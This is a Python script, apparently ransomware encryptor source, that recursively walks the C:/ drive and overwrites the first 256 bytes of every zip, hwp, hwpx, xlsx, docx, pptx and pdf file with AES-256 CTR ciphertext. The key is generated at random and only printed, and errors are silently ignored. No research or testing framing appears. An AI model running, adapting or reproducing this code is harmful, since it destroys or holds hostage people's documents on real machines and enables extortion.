from Crypto.Cipher import AES
from Crypto.Util import Counter
import os
import binascii

# AES encryption function
def encrypt_aes_ctr(data, key, iv):
    ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
    encrypted_data = cipher.encrypt(data)
    return encrypted_data

# Generate a 48-byte AES key (32 bytes for key + 16 bytes for IV).
def generate_aes_key_iv():
    Combine_key = os.urandom(48)
    return Combine_key

# Encrypt a file using AES-256 CTR mode.
def encrypt_file(file_path, key, IV, byte_size=256):
    try:
        with open(file_path, 'rb+') as file:
            binary_data = file.read(byte_size)
            encrypted_data = encrypt_aes_ctr(binary_data, key[:32], IV)
            file.seek(0)
            file.write(encrypted_data)
            remaining_data = file.read()
            file.seek(byte_size)
            file.write(remaining_data)
            return True
    except Exception as e:
        # Do nothing if encryption fails
        pass
    return False

# Encrypt all files in a folder and its subfolders.
def encrypt_files_in_folder(Encrypt_folder_path, Combine_key):
    file_list = []
    extensions = ('zip', 'hwp', 'hwpx', 'xlsx', 'docx', 'pptx', 'pdf')

    encryption_successful = True

    for root, dirs, files in os.walk(Encrypt_folder_path):
        for file in files:
            ext = file.lower().split('.')[-1]
            if ext in extensions:
                file_path = os.path.join(root, file)
                success = encrypt_file(file_path, Combine_key, Combine_key[32:])
                if not success:
                    encryption_successful = False

    print_encryption_result(encryption_successful)

# Print success or failure of encryption.
def print_encryption_result(successful):
    if successful:
        print("Encryption Successful!")
    else:
        print("Encryption Failed for some files!")

if __name__ == "__main__":
    Combine_key = generate_aes_key_iv()
    key = Combine_key[:32]
    IV = Combine_key[32:]
    key_iv_hex = Combine_key.hex().upper()
    print("AES Key (48 bytes in hex):", key_iv_hex)

    Encrypt_folder_path = 'C:/'

    encrypt_files_in_folder(Encrypt_folder_path, Combine_key)
